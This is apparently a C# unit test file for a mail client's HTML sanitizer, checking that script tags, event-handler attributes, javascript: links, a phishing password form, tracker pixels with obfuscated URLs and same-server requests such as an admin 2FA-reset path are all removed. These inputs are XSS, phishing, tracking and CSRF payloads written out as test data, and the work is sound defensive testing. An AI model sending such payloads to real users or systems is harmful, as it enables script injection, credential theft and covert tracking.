using DmOffice.Mail;

namespace DmOffice.Tests;

/// <summary>Angriffe ueber den HTML-Inhalt einer Mail (Ereignis-Attribute, formaction, javascript:-Links).</summary>
public class MailHtmlAttackTests
{
    private static string Clean(string html) => MailHtml.Sanitize(html, allowRemote: true, cid => null).Html;

    [Theory]
    [InlineData("<a href=\"https://x.de\" onpointerup=\"fetch('//evil')\">Klick</a>", "onpointerup")]
    [InlineData("<p onmouseover=\"alert(1)\">x</p>", "onmouseover")]
    [InlineData("<img src=\"x.png\" onerror=\"alert(1)\">", "onerror")]
    [InlineData("<form action=\"https://evil\"><input type=\"submit\" formaction=\"https://evil\" value=\"Weiter\"></form>", "formaction")]
    [InlineData("<a href=\"javascript:alert(1)\">x</a>", "javascript:")]
    [InlineData("<svg onload=\"alert(1)\"><circle r=\"1\"/></svg>", "onload")]
    [InlineData("<iframe src=\"https://evil\"></iframe>", "<iframe")]
    [InlineData("<script>alert(1)</script>", "<script")]
    [InlineData("<a href=\"data:text/html;base64,PHNjcmlwdD4=\">x</a>", "text/html")]
    public void Active_content_is_removed(string html, string forbidden)
    {
        var result = Clean(html);
        Assert.DoesNotContain(forbidden, result, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Formulare_und_Eingabefelder_werden_entfernt()
    {
        // Phishing-Kulisse: Anmeldeformular mit Passwortfeld in einer fremden Mail
        var result = Clean("<p>Bitte bestätigen:</p><form method=\"post\" action=\"https://evil.example/x\">" +
            "<input name=\"user\"><input name=\"p\" type=\"password\"><select><option>A</option></select>" +
            "<textarea>vorbelegt</textarea><button>Anmelden</button></form>");
        foreach (var tag in new[] { "<form", "<input", "<select", "<option", "<textarea", "<button", "password", "evil.example", "vorbelegt" })
            Assert.DoesNotContain(tag, result, StringComparison.OrdinalIgnoreCase);
        // lesbarer Text bleibt
        Assert.Contains("Bitte bestätigen:", result);
        Assert.Contains("Anmelden", result);
    }

    [Theory]
    [InlineData("<img src=\"/&#9;/tracker.example/x.gif\">")]
    [InlineData("<img src=\"/&#10;/tracker.example/x.gif\">")]
    [InlineData("<img src=\"/&#13;/tracker.example/x.gif\">")]
    [InlineData("<img src=\"&#1;//tracker.example/x.gif\">")]
    public void Bildadressen_werden_wie_im_Browser_gelesen(string html)
    {
        var r = MailHtml.Sanitize(html, allowRemote: false, _ => null);
        Assert.True(r.HasRemoteImages);
        Assert.DoesNotContain("src=", r.Html.Replace("data-remote-src=", ""));
        // Mit Tracker-Schutz greift die Pixel-Erkennung auch hier
        var t = MailHtml.Sanitize(html.Replace(">", " width=\"1\" height=\"1\">"), allowRemote: true, _ => null, trackers: true);
        Assert.Equal(1, t.Trackers);
    }

    [Fact]
    public void Schema_mit_Tab_laedt_kein_Bild()
    {
        var r = MailHtml.Sanitize("<img src=\"ht&#9;tps://tracker.example/x.gif\">", allowRemote: false, _ => null);
        Assert.DoesNotContain("src=", r.Html.Replace("data-remote-src=", ""));
    }

    [Fact]
    public void Eigene_Bildadressen_bleiben()
    {
        var r = MailHtml.Sanitize("<img src=\"cid:a1\"><img src=\"cid:a2\"><img src=\"data:image/png;base64,iVBORw0KGgo=\">", allowRemote: false,
            cid => cid == "a1" ? "/api/mail/a/part?uid=1" : "/api/mail/a/part?folder=x&uid=1&index=2");
        Assert.False(r.HasRemoteImages);
        Assert.Contains("src=\"/api/mail/a/part?uid=1\"", r.Html);
        Assert.Contains("src=\"/api/mail/a/part?folder=x&amp;uid=1&amp;index=2\"", r.Html);
        Assert.Contains("src=\"data:image/png", r.Html);
    }

    [Theory]
    [InlineData("<img src=\"/api/admin/users/x/reset-2fa\">")]
    [InlineData("<img src=\"api/files/list\">")]
    [InlineData("<img src=\"ftp://host/x.gif\">")]
    [InlineData("<img src=\"blob:https://host/x\">")]
    public void Adressen_dieses_Servers_laden_kein_Bild(string html)
    {
        foreach (var allow in new[] { false, true })
        {
            var r = MailHtml.Sanitize(html, allowRemote: allow, _ => null);
            Assert.DoesNotContain("src=", r.Html);
        }
    }

    [Theory]
    [InlineData("<p style=\"background:url(https:/tracker.test/a.gif)\">x</p>")]
    [InlineData("<p style=\"background:url(https:tracker.test/a.gif)\">x</p>")]
    [InlineData("<p style=\"background:url('/\\\\tracker.test/b.gif')\">x</p>")]
    [InlineData("<p style=\"background-image:url(&quot;//tracker.test/c.gif&quot;)\">x</p>")]
    [InlineData("<style>p{background:url(https:/tracker.test/d.gif)}</style><p>x</p>")]
    public void Stil_laedt_nichts_aus_dem_Netz_wenn_gesperrt(string html)
    {
        var r = MailHtml.Sanitize(html, allowRemote: false, _ => null);
        Assert.DoesNotContain("tracker.test", r.Html);
        // Ob ein Hinweis zum Nachladen erscheint, hängt davon ab, wie der Stil die Adresse liest; geladen wird nichts
    }

    [Theory]
    [InlineData("<p style=\"background:url(/api/probe/x.gif)\">x</p>")]
    [InlineData("<p style=\"background:url('api/probe/x.gif')\">x</p>")]
    [InlineData("<style>p{background:url(/api/probe/x.gif)}</style><p>x</p>")]
    [InlineData("<table background=\"/api/probe/x.gif\"><tr><td>x</td></tr></table>")]
    public void Stil_laedt_nichts_von_diesem_Server(string html)
    {
        foreach (var allow in new[] { false, true })
            Assert.DoesNotContain("/api/probe", MailHtml.Sanitize(html, allowRemote: allow, _ => null).Html);
    }

    [Fact]
    public void Erlaubte_Hintergrundbilder_bleiben()
    {
        var r = MailHtml.Sanitize("<p style=\"background:url(https://cdn.example/a.png)\">x</p><p style=\"background:url(data:image/png;base64,iVBORw0KGgo=)\">y</p>", allowRemote: true, _ => null);
        Assert.Contains("cdn.example/a.png", r.Html);
        Assert.Contains("data:image/png", r.Html);
        Assert.Contains("url(", r.Html);
    }

    [Fact]
    public void Text_mit_url_Klammer_bleibt()
    {
        Assert.Contains("url(/irgendwas)", MailHtml.Sanitize("<p>Schreib url(/irgendwas) in die Zeile</p>", allowRemote: false, _ => null).Html);
    }
}
